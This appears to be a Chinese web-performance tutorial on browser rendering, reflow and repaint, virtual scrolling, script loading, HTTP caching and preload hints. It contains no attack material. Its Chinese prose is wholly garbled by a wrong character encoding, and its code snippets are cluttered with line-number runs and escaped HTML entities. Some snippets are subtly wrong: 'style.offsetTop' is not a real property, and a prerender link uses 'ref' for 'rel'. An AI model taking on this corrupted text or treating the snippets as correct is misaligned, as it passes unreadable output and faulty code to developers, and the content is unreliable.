å­—èŠ‚æ•°æ®ã€‚å½“æµè§ˆå™¨æŽ¥æ”¶åˆ°è¿™äº›å­—èŠ‚æ•°æ®åŽï¼Œå®ƒä¼šå°†è¿™äº›å­—èŠ‚æ•°æ®è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å†™çš„ä»£ç ã€‚ å½“æ•°æ®è¢«è½¬æ¢æˆå­—ç¬¦ä»¥åŽï¼Œæµè§ˆå™¨ä¼šå°†è¿™äº›å­—ç¬¦ä¸²é€šè¿‡è¯æ³•åˆ†æžè½¬æ¢ä¸ºæ ‡è®°ï¼ˆTokenï¼‰ï¼Œè¿™ä¸€è¿‡ç¨‹å«åšæ ‡ä»·åŒ–ï¼ˆtokenizationï¼‰ æ‰“æ ‡è®°ä¼šå°†ä»£ç åˆ†æˆä¸€å—å—ï¼Œç„¶åŽæ‰“ä¸Šæ ‡è®°ï¼Œä¾¿äºŽç†è§£è¿™äº›æœ€å°å•ä½çš„ä»£ç çš„å«ä¹‰ã€‚ç»“æŸæ ‡è®°åŒ–åŽå¼€å§‹è½¬æ¢ä¸º Nodeï¼Œæœ€åŽè¿™äº› Node ä¼šæ ¹æ®ä¸åŒ Node ä¹‹é—´çš„è”ç³»æž„å»ºä¸ºä¸€é¢— DOM æ ‘ 1å­—èŠ‚æ•°æ® =&gt; å­—ç¬¦ä¸² =&gt; Token =&gt; Node =&gt; DOM CSS =&gt; CSSDOM æ ‘ä¸Žä¸Šé¢çš„è¿‡ç¨‹æ˜¯ç±»ä¼¼çš„ã€‚åœ¨è¿™ä¸€è¿‡ç¨‹ä¸­æµè§ˆå™¨ä¼šç¡®å®šä¸‹æ¯ä¸€ä¸ªèŠ‚ç‚¹çš„æ ·å¼æ˜¯ä»€ä¹ˆï¼Œå¹¶ä¸”åœ¨è¿™ä¸€è¿‡ç¨‹ä¸­æ˜¯å¾ˆæ¶ˆè€—èµ„æºçš„ã€‚æµè§ˆå™¨å¾—é€’å½’ CSSDOM æ ‘ï¼Œç„¶åŽç¡®å®šå…·ä½“çš„å…ƒç´ åˆ°åº•æ˜¯ä»€ä¹ˆæ ·å¼ 1å­—èŠ‚æ•°æ® =&gt; å­—ç¬¦ä¸² =&gt; Token =&gt; Node =&gt; CSSDOM ç”Ÿæˆæ¸²æŸ“æ ‘å°† DOM ä¸Ž CSSOM åˆå¹¶ä¸ºä¸€ä¸ªæ¸²æŸ“æ ‘ è¿™ä¸€è¿‡ç¨‹ä¸æ˜¯ç®€å•å°†ä¸¤è€…ç»“åˆï¼Œæ¸²æŸ“æ ‘åªä¼šåŒ…æ‹¬ã¤‡æ˜¾ç¤ºçš„èŠ‚ç‚¹å’Œè¿™äº›èŠ‚ç‚¹æ ·å¼ä¿¡æ¯ï¼Œå¦‚æžœæŸä¸ªèŠ‚ç‚¹æ˜¯ display:none çš„ï¼Œé‚£ä¹ˆå°±ä¸ä¼šåœ¨æ¸²æŸ“æ ‘ä¸­æ˜¾ç¤º å½“æµè§ˆå™¨ç”Ÿæˆæ¸²æŸ“æ ‘ä»¥åŽï¼Œå°±ä¼šæ ¹æ®æ¸²æŸ“æ ‘æ¥è¿›è¡Œå¸ƒå±€ï¼ˆä¹Ÿå¯ä»¥å«åšå›žæµï¼‰ï¼Œç„¶åŽè°ƒç”¨ GPU ç»˜åˆ¶ï¼Œåˆæˆå›¾å±‚ï¼Œæ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚ æµè§ˆå™¨çš„æ¸²æŸ“æœºåˆ¶ä¸€èˆ¬åˆ†æˆä¸‹é¢å‡ ä¸ªæ­¥éª¤ å¤„ç† HTML å¹¶æž„å»º DOM æ ‘ å¤„ç† CSS æž„å»º CSSOM æ ‘ å°† DOM ä¸Ž CSSOM åˆå¹¶ä¸ºä¸€ä¸ªæ¸²æŸ“æ ‘ æ ¹æ®æ¸²æŸ“æ ‘æ¥å¸ƒå±€ï¼Œè®¡ç®—æ¯ä¸ªèŠ‚ç‚¹ä½ç½® è°ƒç”¨ GPU ç»˜åˆ¶ï¼Œåˆæˆå›¾å±‚ï¼Œæ˜¾ç¤ºåœ¨å±å¹•ä¸Š ç»å…¸é¢è¯•é¢˜ç›®ï¼šæ’å…¥å‡ ä¸‡ä¸ª DOMï¼Œå¦‚ä½•å®žçŽ°é¡µé¢ä¸å¡é¡¿ï¼Ÿå› ä¸º DOM æ˜¯å±žäºŽæ¸²æŸ“å¼•æ“Žä¸­çš„ä¸œè¥¿ï¼Œè€Œ JS åˆæ˜¯ JS å¼•æ“Žä¸­çš„ä¸œè¥¿ã€‚å½“æˆ‘ä»¬é€šè¿‡ JS æ“ä½œ DOM çš„æ—¶å€™ï¼Œå…¶å®žè¿™ä¸ªæ“ä½œæ¶‰åŠåˆ°äº†ä¸¤ä¸ªçº¿ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼Œé‚£ä¹ˆåŠ¿å¿…ä¼šå¸¦æ¥ä¸€äº›æ€§èƒ½ä¸Šçš„æŸè€—ã€‚æ“ä½œ DOM æ¬¡æ•°ä¸€å¤šï¼Œä¹Ÿå°±ç­‰åŒäºŽä¸€ç›´åœ¨è¿›è¡Œçº¿ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼Œå¹¶ä¸”æ“ä½œ DOM å¯èƒ½è¿˜ä¼šå¸¦æ¥é‡ç»˜å›žæµçš„æƒ…å†µï¼Œæ‰€ä»¥ä¹Ÿå°±å¯¼è‡´äº†æ€§èƒ½ä¸Šçš„é—®é¢˜ã€‚ å¯¹äºŽè¿™é“é¢˜ç›®æ¥è¯´ï¼Œé¦–å…ˆæˆ‘ä»¬è‚¯å®šä¸èƒ½ä¸€æ¬¡æ€§æŠŠå‡ ä¸‡ä¸ª DOM å…¨éƒ¨æ’å…¥ï¼Œè¿™æ ·è‚¯å®šä¼šé€ æˆå¡é¡¿ï¼Œæ‰€ä»¥è§£å†³é—®é¢˜çš„é‡ç‚¹åº”è¯¥æ˜¯å¦‚ä½•åˆ†æ‰¹æ¬¡éƒ¨åˆ†æ¸²æŸ“ DOMã€‚å¤§éƒ¨åˆ†äººåº”è¯¥å¯ä»¥æƒ³åˆ°é€šè¿‡ requestAnimationFrameçš„æ–¹å¼åŽ»å¾ªçŽ¯çš„æ’å…¥ DOMï¼Œå…¶å®žè¿˜æœ‰ç§æ–¹å¼åŽ»è§£å†³è¿™ä¸ªé—®é¢˜ï¼šè™šæ‹Ÿæ»šåŠ¨ï¼ˆvirtualized scrollerï¼‰ã€‚ è¿™ç§æŠ€æœ¯çš„åŽŸç†å°±æ˜¯åªæ¸²æŸ“å¯è§†åŒºåŸŸå†…çš„å†…å®¹ï¼Œéžå¯è§åŒºåŸŸçš„é‚£å°±å®Œå…¨ä¸æ¸²æŸ“äº†ï¼Œå½“ç”¨æˆ·åœ¨æ»šåŠ¨çš„æ—¶å€™å°±å®žæ—¶åŽ»æ›¿æ¢æ¸²æŸ“çš„å†…å®¹ã€‚ å½“æˆ‘ä»¬æ»šåŠ¨é¡µé¢çš„æ—¶å€™å°±ä¼šå®žæ—¶åŽ»æ›´æ–° DOMï¼Œè¿™ä¸ªæŠ€æœ¯å°±èƒ½é¡ºåˆ©è§£å†³è¿™é“ç»å…¸é¢è¯•é¢˜ã€‚äº†è§£æ›´å¤šç‚¹å‡» react-virtualizedã€‚ æŽ˜é‡‘ä¸Šçš„æ–¹æ¡ˆ æ–¹æ¡ˆä¸€ï¼šåˆ†é¡µï¼Œæ‡’åŠ è½½ï¼ŒæŠŠæ•°æ®åˆ†é¡µï¼Œç„¶åŽæ¯æ¬¡æŽ¥å—ä¸€å®šçš„æ•°æ®ï¼Œé¿å…ä¸€æ¬¡æ€§æŽ¥æ”¶å¤ªå¤š æ–¹æ¡ˆäºŒï¼šsetIntervalï¼ŒsetTimeoutï¼ŒrequestAnimationFrame åˆ†æ‰¹æ¸²æŸ“ï¼Œè®©æ•°æ®åœ¨ä¸åŒå¸§å†…åŽ»åšæ¸²æŸ“ æ–¹æ¡ˆä¸‰ï¼šä½¿ç”¨ virtual-scrollï¼Œè™šæ‹Ÿæ»šåŠ¨ã€‚ virtual-scroll è™šæ‹Ÿæ»šåŠ¨ï¼Œè¿™ç§æ–¹å¼æ˜¯æŒ‡æ ¹æ®å®¹å™¨å…ƒç´ çš„é«˜åº¦ä»¥åŠåˆ—è¡¨é¡¹å…ƒç´ çš„é«˜åº¦æ¥æ˜¾ç¤ºé•¿åˆ—è¡¨æ•°æ®ä¸­çš„æŸä¸€ä¸ªéƒ¨åˆ†ï¼Œè€Œä¸æ˜¯åŽ»å®Œæ•´åœ°æ¸²æŸ“é•¿åˆ—è¡¨ï¼Œä»¥æé«˜æ— é™æ»šåŠ¨çš„æ€§èƒ½ã€‚ virtual-scroll åŽŸç†ï¼Œåœ¨ç”¨æˆ·æ»šåŠ¨æ—¶ï¼Œæ”¹å˜åˆ—è¡¨å¯è§†åŒºåŸŸçš„æ¸²æŸ“éƒ¨åˆ† è®¡ç®—å½“å‰å¯è§åŒºåŸŸèµ·å§‹æ•°æ®çš„ startIndex è®¡ç®—å½“å‰å¯è§åŒºåŸŸç»“æŸæ•°æ®çš„ endIndex è®¡ç®—å½“å‰å¯è§åŒºåŸŸçš„æ•°æ®ï¼Œå¹¶æ¸²æŸ“åˆ°é¡µé¢ä¸­ è®¡ç®— startIndex å¯¹åº”çš„æ•°æ®åœ¨æ•´ä¸ªåˆ—è¡¨ä¸­çš„åç§»ä½ç½® startOffset å¹¶è®¾ç½®åˆ°åˆ—è¡¨ä¸Š è®¡ç®— endIndex å¯¹åº”çš„æ•°æ®ç›¸å¯¹äºŽå¯æ»šåŠ¨åŒºåŸŸæœ€åº•éƒ¨çš„åç§»ä½ç½® endOffsetï¼Œå¹¶è®¾ç½®åˆ° åˆ—è¡¨ä¸Š startOffset å’Œ endOffset ä¼šæ’‘å¼€å®¹å™¨å…ƒç´ çš„å†…å®¹é«˜åº¦ï¼Œè®©å…¶å¯æŒç»­çš„æ»šåŠ¨ï¼›æ­¤å¤–ï¼Œè¿˜èƒ½ä¿æŒæ»šåŠ¨æ¡å¤„äºŽä¸€ä¸ªæ­£ç¡®çš„ä½ç½®ã€‚ é˜»å¡žæ¸²æŸ“çš„æƒ…å†µé¦–å…ˆæ¸²æŸ“æ˜¯ç”Ÿæˆæ¸²æŸ“æ ‘ï¼Œæ‰€ä»¥ HTML å’Œ CSS è‚¯å®šä¼šé˜»å¡žæ¸²æŸ“ï¼Œå¦‚æžœæƒ³è¦æ¸²æŸ“æ›´å¿«ï¼Œå°±åº”è¯¥é™ä½Žä¸€å¼€å§‹éœ€è¦æ¸²æŸ“çš„æ–‡ä»¶å¤§å°ï¼Œå¹¶ä¸”æ‰å¹³å±‚çº§ï¼Œä¼˜åŒ–é€‰æ‹©å™¨ã€‚ ç„¶åŽå½“æµè§ˆå™¨åœ¨è§£æžåˆ° script æ ‡ç­¾çš„æ—¶å€™ï¼Œä¼šæš‚åœæž„å»º DOM ï¼Œå®Œæˆä¹‹åŽæ‰ä¼šä»Žæš‚åœçš„åœ°æ–¹é‡æ–°å¼€å§‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œï¼Œå¦‚æžœä½ æƒ³é¦–å±æ¸²æŸ“çš„è¶Šå¿«ï¼Œå°±è¶Šä¸åº”è¯¥åœ¨é¦–å±å°±åŠ è½½ JS æ–‡ä»¶ï¼Œè¿™ä¹Ÿæ˜¯éƒ½å»ºè®®å°† script æ ‡ç­¾æ”¾åœ¨ body æ ‡ç­¾åº•éƒ¨çš„åŽŸå› ã€‚ ä¹Ÿå¯ä»¥ç»™ script æ ‡ç­¾æ·»åŠ  defer æˆ–è€… async å±žæ€§ã€‚å½“ script æ ‡ç­¾åŠ ä¸Š defer å±žæ€§ä»¥åŽï¼Œè¡¨ç¤ºè¯¥ JS æ–‡ä»¶ä¼šå¹¶è¡Œä¸‹è½½ï¼Œä½†æ˜¯ä¼šæ”¾åˆ° HTML è§£æžå®ŒæˆåŽé¡ºåºæ‰§è¡Œï¼Œæ‰€ä»¥å¯¹äºŽè¿™ç§æƒ…å†µä½ å¯ä»¥æŠŠ script æ ‡ç­¾æ”¾åœ¨ä»»æ„ä½ç½®ã€‚å¯¹äºŽæ²¡æœ‰ä»»ä½•ä¾èµ–çš„ JS æ–‡ä»¶å¯ä»¥åŠ ä¸Š async å±žæ€§ï¼Œè¡¨ç¤º JS æ–‡ä»¶ä¸‹è½½å’Œè§£æžä¸ä¼šé˜»å¡žæ¸²æŸ“ã€‚ Load å’Œ DOMContentLoaded åŒºåˆ«Load äº‹ä»¶è§¦å‘ä»£è¡¨é¡µé¢ä¸­çš„ DOM ï¼ŒCSS ï¼ŒJS ,å›¾ç‰‡å·²ç»å…¨éƒ¨åŠ è½½å®Œæ¯• DOMContentLoaded äº‹ä»¶è§¦å‘ä»£è¡¨åˆå§‹çš„ HTML è¢«å®Œå…¨åŠ è½½å’Œè§£æžï¼Œä¸éœ€è¦ç­‰å¾… CSSï¼ŒJS å’Œå›¾ç‰‡åŠ è½½. å›¾å±‚ä¸€èˆ¬æ¥è¯´ï¼Œå¯ä»¥æŠŠæ™®é€šæ–‡æ¡£æµçœ‹åšæ˜¯ä¸€ä¸ªå›¾å±‚ã€‚ç‰¹å®šçš„å±žæ€§å¯ä»¥ç”Ÿæˆä¸€ä¸ªæ–°çš„å›¾å±‚ã€‚ä¸åŒçš„å›¾å±‚æ¸²æŸ“äº’ä¸å½±å“ï¼Œæ‰€ä»¥å¯¹äºŽæŸäº›é¢‘ç¹éœ€è¦æ¸²æŸ“çš„å»ºè®®å•ç‹¬ç”Ÿæˆä¸€ä¸ªæ–°å›¾å±‚ï¼Œæé«˜æ€§èƒ½ã€‚ä½†ä¹Ÿä¸èƒ½ç”Ÿæˆè¿‡å¤šçš„å›¾å±‚ï¼Œä¼šå¼•èµ·åä½œç”¨ã€‚ é€šå¸¸ä¸‹é¢å‡ ä¸ªå¸¸ç”¨å±žæ€§å¯ä»¥ç”Ÿæˆæ–°å›¾å±‚ 3D å˜æ¢ï¼štranslate3dï¼ŒtranslateZ will-change video,iframe æ ‡ç­¾ é€šè¿‡åŠ¨ç”»å®žçŽ°çš„ opacity åŠ¨ç”»è½¬æ¢ positionï¼šfixed é‡ç»˜ï¼ˆRepaintï¼‰ å’Œ å›žæµï¼ˆReflowï¼‰é‡ç»˜å’Œå›žæµæ˜¯æ¸²æŸ“æ­¥éª¤ä¸­çš„ä¸€å°èŠ‚ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªæ­¥éª¤å¯¹äºŽæ€§èƒ½å½±å“å¾ˆå¤§ã€‚ é‡ç»˜æ˜¯å½“èŠ‚ç‚¹éœ€è¦æ›´æ”¹å¤–è§‚è€Œä¸å½±å“å¸ƒå±€çš„æ—¶å€™ï¼Œæ¯”å¦‚æ”¹å˜ color ï¼Œå°±å«åšé‡ç»˜ å›žæµæ˜¯å¸ƒå±€æˆ–è€…å‡ ä½•å±žæ€§éœ€è¦æ”¹å˜å°±æˆä¸ºå›žæµ å›žæµå¿…å®šä¼šå¼•èµ·é‡ç»˜ï¼Œé‡ç»˜ä¸ä¸€å®šä¼šå¼•èµ·å›žæµã€‚å›žæµæ‰€éœ€è¦çš„æˆæœ¬æ¯”é‡ç»˜é«˜å¾·å¤šï¼Œæ”¹å˜æ·±å±‚æ¬¡çš„èŠ‚ç‚¹å¾ˆå¯èƒ½ä¼šå¯¼è‡´çˆ¶èŠ‚ç‚¹çš„ä¸€ç³»åˆ—å›žæµã€‚ æ‰€ä»¥ä¸€ä¸‹å‡ ä¸ªåŠ¨ä½œå¯èƒ½ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜ï¼š æ”¹å˜ window å¤§å° æ”¹å˜å­—ä½“ æ·»åŠ æˆ–è€…åˆ é™¤æ ·å¼ æ–‡å­—æ”¹å˜ å®šä½æˆ–è€…æµ®åŠ¨ ç›’æ¨¡åž‹ é‡ç»˜å’Œå›žæµå…¶å®žå’Œ Event Loop æœ‰å…³ å½“ Event Loop æ‰§è¡Œå®Œ Microtasks åŽï¼Œä¼šåˆ¤æ–­ document æ˜¯å¦éœ€è¦æ›´æ–°ã€‚å› ä¸º æµè§ˆå™¨æ˜¯ 60HZ çš„åˆ·æ–°çŽ‡ï¼Œä¹Ÿå°±æ˜¯ 16.6ms æ‰ä¼šæ›´æ–°ä¸€æ¬¡ åˆ¤æ–­æ˜¯å¦æœ‰ resize æˆ–è€… scroll ï¼Œæœ‰ç‚¹è¯å°±å›žåŽ»è§¦å‘äº‹ä»¶ï¼Œæ‰€ä»¥ resize å’Œ scroll äº‹ä»¶ä¹Ÿæ˜¯è‡³å°‘ 16ms æ‰ä¼šè§¦å‘ä¸€æ¬¡ï¼Œå¹¶ä¸”è‡ªå¸¦èŠ‚æµåŠŸèƒ½ã€‚ åˆ¤æ–­æ˜¯å¦è§¦å‘äº† media query æ›´æ–°åŠ¨ç”»å¹¶ä¸”å‘é€æ—¶é—´ åˆ¤æ–­æ˜¯å¦æœ‰å…¨å±æ“ä½œäº‹ä»¶ æ‰§è¡Œ requestAnimationFrame å›žè°ƒ æ‰§è¡Œ IntersectionObserver å›žè°ƒï¼Œè¯¥æ–¹æ³•ç”¨äºŽåˆ¤æ–­å…ƒç´ æ˜¯å¦å¯è§ï¼Œå¯ä»¥ç”¨äºŽæ‡’åŠ è½½ä¸Šé¢ï¼Œä½†æ˜¯å…¼å®¹æ€§ä¸æ˜¯å¾ˆå¥½ æ›´æ–°ç•Œé¢ ä»¥ä¸Šå°±æ˜¯ä¸€å¸§ä¸­å¯èƒ½ä¼šåšçš„äº‹æƒ…ï¼Œå¦‚æžœåœ¨ä¸€å¸§ä¸­æœ‰ç©ºé—²æ—¶é—´ï¼Œå°±ä¼šåŽ»æ‰§è¡Œ requestIdleCallback å›žè°ƒ å‡å°‘é‡ç»˜å’Œå›žæµä½¿ç”¨ translate æ›¿ä»£ top 12345678910111213141516&lt;div class='test'&gt;&lt;/div&gt;&lt;style&gt; .test&#123; position:absolute; top:10px; width:100px; height:100px; background:red; &#125;&lt;/style&gt;&lt;script&gt; setTimeout(()=&gt;&#123; // å¼•èµ·å›žæµ document.querySelector('.test').style.top = '100px'; &#125;,1000);&lt;/script&gt; ä½¿ç”¨ visibility æ›¿ä»£ display:noneï¼Œå› ä¸ºå‰è€…åªä¼šå¼•èµ·é‡ç»˜ï¼ŒåŽè€…ä¼šå¼•èµ·å›žæµï¼ˆæ”¹å˜äº†å¸ƒå±€ï¼‰ æŠŠ DOM ç¦»çº¿åŽä¿®æ”¹ã€‚æ¯”å¦‚ï¼šå…ˆ æŠŠ DOM ç»™ display:none(æœ‰ä¸€æ¬¡å›žæµ)ï¼Œç„¶åŽä½ ä¿®æ”¹100æ¬¡ï¼Œç„¶åŽå†æŠŠå®ƒæ˜¾ç¤ºå‡ºæ¥ã€‚ ä¸è¦æŠŠ DOM ç»“ç‚¹çš„å±žæ€§å€¼æ”¾åœ¨ä¸€ä¸ªå¾ªçŽ¯é‡Œå½“åšå¾ªçŽ¯é‡Œçš„å˜é‡ 1234for(let i=0;i&lt;1000;i++)&#123; // èŽ·å– offsetTop ä¼šå¯¼è‡´å›žæµï¼Œå› ä¸ºéœ€è¦åŽ»èŽ·å–æ­£ç¡®çš„å€¼ console.log(document.querySelector('.test').style.offsetTop);&#125; ä¸è¦ä½¿ç”¨ table å¸ƒå±€ï¼Œå¯èƒ½ä¸€ä¸ªå¾ˆå°çš„æ”¹åŠ¨éƒ½ä¼šé€ æˆæ•´ä¸ª table çš„é‡æ–°å¸ƒå±€ åŠ¨ç”»å®žçŽ°çš„é€Ÿåº¦çš„é€‰æ‹©ï¼ŒåŠ¨ç”»é€Ÿåº¦è¶Šå¿«ï¼Œå›žæµæ¬¡æ•°è¶Šå¤šï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ requestAnimationFrame CSS é€‰æ‹©ç¬¦ä»Žå³å¾€å·¦åŒ¹é…æŸ¥æ‰¾ï¼Œé¿å… DOM æ·±åº¦è¿‡æ·± å°†é¢‘ç¹è¿è¡Œçš„åŠ¨ç”»å˜æˆå›¾å±‚ï¼Œå›¾å±‚èƒ½å¤Ÿé˜»æ­¢è¯¥èŠ‚ç‚¹å›žæµå½±å“åˆ«çš„å…ƒç´ ã€‚æ¯”å¦‚å¯¹äºŽ video æ ‡ç­¾ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å°†è¯¥èŠ‚ç‚¹å˜æˆå›¾å±‚ æ€§èƒ½ç½‘ç»œç›¸å…³DNS é¢„è§£æžDNS è§£æžä¹Ÿæ˜¯éœ€è¦æ—¶é—´çš„ï¼Œå¯ä»¥é€šè¿‡é¢„è§£æžçš„æ–¹å¼æ¥é¢„å…ˆèŽ·å¾—åŸŸåæ‰€å¯¹åº”çš„ IP 1&lt;link rel="dns-prefetch" href="//xxx.cn"&gt;&lt;/link&gt; ç¼“å­˜ç¼“å­˜å¯¹äºŽå‰ç«¯æ€§èƒ½ä¼˜åŒ–æ¥è¯´æ˜¯ä¸€ä¸ªé‡è¦çš„ç‚¹ï¼Œè‰¯å¥½çš„ç¼“å­˜ç­–ç•¥å¯ä»¥é™ä½Žèµ„æºçš„é‡å¤åŠ è½½æé«˜ç½‘é¡µçš„æ•´ä½“åŠ è½½é€Ÿåº¦ã€‚ é€šå¸¸æµè§ˆå™¨ç¼“å­˜ç­–ç•¥åˆ†æˆä¸¤ç§ï¼šå¼ºç¼“å­˜å’Œåå•†ç¼“å­˜ã€‚ å¼ºç¼“å­˜å®žçŽ°å¼ºç¼“å­˜å¯ä»¥é€šè¿‡ä¸¤ç§å“åº”å¤´å®žçŽ°ï¼šExpires å’Œ Cache-Control ã€‚å¼ºç¼“å­˜è¡¨ç¤ºåœ¨ç¼“å­˜æœŸé—´ä¸éœ€è¦è¯·æ±‚ï¼Œstate code ä¸º 200 1Expires:Tue,09 Apr 2019 08:39:00 GMT Expires æ˜¯ HTTP/1.0 çš„äº§ç‰©ï¼Œè¡¨ç¤ºèµ„æºä¼šåœ¨ä¸Šè¿°æ—¶é—´åŽè¿‡æœŸï¼Œéœ€è¦å†æ¬¡è¯·æ±‚ï¼Œå¹¶ä¸” Expires å—é™äºŽæœ¬åœ°æ—¶é—´ï¼Œå¦‚æžœä¿®æ”¹äº†æœ¬åœ°æ—¶é—´ï¼Œå¯èƒ½ä¼šé€ æˆç¼“å­˜å¤±æ•ˆã€‚ 1Cache-control:max-age=30 Cache-control å‡ºçŽ°äºŽ HTTP/1.1 ä¼˜å…ˆçº§é«˜äºŽ Expiresã€‚è¯¥å±žæ€§è¡¨ç¤ºè‡ªæ„¿ä¼šåœ¨ 30ç§’åŽè¿‡æœŸï¼Œéœ€è¦å†æ¬¡è¯·æ±‚ã€‚ åå•†ç¼“å­˜å¦‚æžœç¼“å­˜è¿‡æœŸäº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨åå•†ç¼“å­˜æ¥è§£å†³é—®é¢˜ã€‚åå•†ç¼“å­˜éœ€è¦è¯·æ±‚ï¼Œå¦‚æžœç¼“å­˜æœ‰æ•ˆä¼šè¿”å›ž 304,ã€ åå•†ç¼“å­˜éœ€è¦å®¢æˆ·å’ŒæœåŠ¡ç«¯å…±åŒå®žçŽ°ï¼Œå’Œå¼ºç¼“å­˜ä¸€æ ·ï¼Œä¹Ÿæœ‰ä¸¤ç§å®žçŽ°æ–¹å¼ã€‚ Last-Modified å’Œ If-Modified-Since Last-Modified è¡¨ç¤ºæœ¬åœ°æ–‡ä»¶æœ€åŽä¿®æ”¹æ—¥æœŸï¼ŒIf-Modified-Since ä¼šå°† Last-Modified çš„å€¼å‘é€ç»™æœåŠ¡å™¨ï¼Œè¯¢é—®æœåŠ¡å™¨åœ¨è¯¥æ—¥æœŸåŽèµ„æºæ˜¯å¦æœ‰æ›´æ–°ï¼Œæœ‰æ›´æ–°çš„è¯å°±ä¼šå°†æ–°çš„èµ„æºå‘é€å›žæ¥ã€‚ ä½†æ˜¯å¦‚æžœåœ¨æœ¬åœ°æ‰“å¼€ç¼“å­˜æ–‡ä»¶ï¼Œå°±ä¼šé€ æˆ Last-Modified è¢«ä¿®æ”¹ï¼Œæ‰€ä»¥åœ¨ HTTP/1.1 å‡ºçŽ°äº† ETag ETag å’Œ If-None-Match ETag ç±»ä¼¼äºŽæ–‡ä»¶æŒ‡çº¹ï¼ŒIf-None-Match ä¼šå°† å½“å‰çš„ Etag å‘é€ç»™æœåŠ¡å™¨ï¼Œè¯¢é—®è¯¥èµ„æº Etag æ˜¯å¦å˜åŠ¨ï¼Œå¦‚æžœæœ‰å˜åŠ¨çš„è¯å°±å°†æ–°çš„èµ„æºå‘é€å›žæ¥ï¼Œå¹¶ä¸” ETag ä¼˜å…ˆçº§æ¯” Last-Modified é«˜ã€‚ é€‰æ‹©åˆé€‚çš„ç¼“å­˜ç­–ç•¥å¯¹äºŽå¤§éƒ¨åˆ†çš„åœºæ™¯éƒ½å¯ä»¥ä½¿ç”¨å¼ºç¼“å­˜é…åˆåå•†ç¼“å­˜æ¥è§£å†³ï¼Œä½†æ˜¯æœ‰ä¸€äº›ç‰¹æ®Šçš„åœ°æ–¹å¯èƒ½éœ€è¦é€‰æ‹©ç‰¹æ®Šçš„ç¼“å­˜ç­–ç•¥ï¼š å¯¹äºŽæŸäº›ä¸éœ€è¦ç¼“å­˜çš„èµ„æºï¼Œå¯ä»¥ä½¿ç”¨ Cache-control:no-store æ¥è¡¨ç¤ºè¯¥èµ„æºä¸éœ€è¦ç¼“å­˜ å¯¹äºŽé¢‘ç¹å˜åŠ¨çš„èµ„æºï¼Œå¯ä»¥ä½¿ç”¨ Cache-control:no-cache å¹¶é…åˆ ETag ä½¿ç”¨ï¼Œè¡¨ç¤ºè¯¥èµ„æºå·²è¢«ç¼“å­˜ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½ä¼šå‘é€è¯·æ±‚è¯¢é—®èµ„æºæ˜¯å¦æ›´æ–°ã€‚ å¯¹äºŽä»£ç æ–‡ä»¶æ¥è¯´ï¼Œé€šå¸¸ä½¿ç”¨ Cache-control:max-age=31536000 å¹¶é…åˆç­–ç•¥ç¼“å­˜ä½¿ç”¨ï¼Œç„¶åŽå¯¹æ–‡ä»¶è¿›è¡ŒæŒ‡çº¹å¤„ç†ï¼Œä¸€æ—¦æ–‡ä»¶åå˜åŠ¨å°±ä¼šç«‹åˆ»ä¸‹è½½æ–°çš„æ–‡ä»¶ã€‚ ä½¿ç”¨ HTTP/2.0å› ä¸ºæµè§ˆå™¨ä¼šæœ‰å¹¶å‘è¯·æ±‚çš„é™åˆ¶ï¼Œåœ¨ HTTP/1.1 æ—¶ä»£ï¼Œæ¯ä¸ªè¯·æ±‚éƒ½éœ€è¦å»ºç«‹å’Œæ–­å¼€ï¼Œæ¶ˆè€—äº†å¥½å‡ ä¸ª RTT æ—¶é—´ï¼Œå¹¶ä¸”ç”±äºŽ TCP æ…¢å¯åŠ¨çš„åŽŸå› ï¼ŒåŠ è½½ä½“ç§¯å¤§çš„æ–‡ä»¶ä¼šéœ€è¦æ›´å¤šçš„æ—¶é—´ åœ¨ HTTP/2.0 ä¸­å¼•å…¥äº†å¤šè·¯å¤ç”¨ï¼Œèƒ½å¤Ÿè®©å¤šä¸ªè¯·æ±‚ä½¿ç”¨åŒä¸ª TCP é“¾æŽ¥ï¼Œæžå¤§çš„åŠ å¿«äº†ç½‘é¡µçš„åŠ è½½é€Ÿåº¦ã€‚è¿˜æ”¯æŒ Header åŽ‹ç¼©ï¼Œè¿›ä¸€æ­¥å«ä¸Šäº†è¯·æ±‚çš„æ•°æ®å¤§å° é¢„åŠ è½½ é¢„åŠ è½½æ˜¯å£°æ˜Žå¼çš„ fetchï¼Œå¼ºåˆ¶æµè§ˆå™¨è¯·æ±‚èµ„æºï¼Œå¹¶ä¸”ä¸ä¼šé˜»å¡ž onload äº‹ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ä»£ç ï¼š 1&lt;link rel="preload" href="xxx.com"&gt;&lt;/link&gt; é¢„åŠ è½½å¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šé™ä½Žé¦–å±çš„æ—¶é—´ï¼Œå› ä¸ºå¯ä»¥å°†ä¸€äº›ä¸å“åº”é¦–å±ä½†æ˜¯é‡è¦çš„æ–‡ä»¶å»¶åŽï¼Œå”¯ä¸€çš„ç¼ºç‚¹å°±æ˜¯å…¼å®¹æ€§ä¸å¥½ã€‚ é¢„æ¸²æŸ“å¯ä»¥é€šè¿‡é¢„æ¸²æŸ“å°†ä¸‹è½½çš„æ–‡ä»¶é¢„å…ˆåœ¨åŽå°æ¸²æŸ“ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ä»£ç å¼€å¯ï¼š 1&lt;link ref="prerender" href="xxx.com"&gt;&lt;/link&gt; é¢„æ¸²æŸ“å¯ä»¥æé«˜é¡µé¢çš„æž¶å­å•Šé€Ÿåº¦ï¼Œä½†æ˜¯è¦ç¡®ä¿è¯¥é¡µé¢ç™¾åˆ†ä¹‹ç™¾ä¼šè¢«ç”¨æˆ·ä¹‹åŽæ‰“å¼€ï¼Œå¦åˆ™å°±ç™½ç™½æµªè´¹èµ„æºäº†ã€‚ 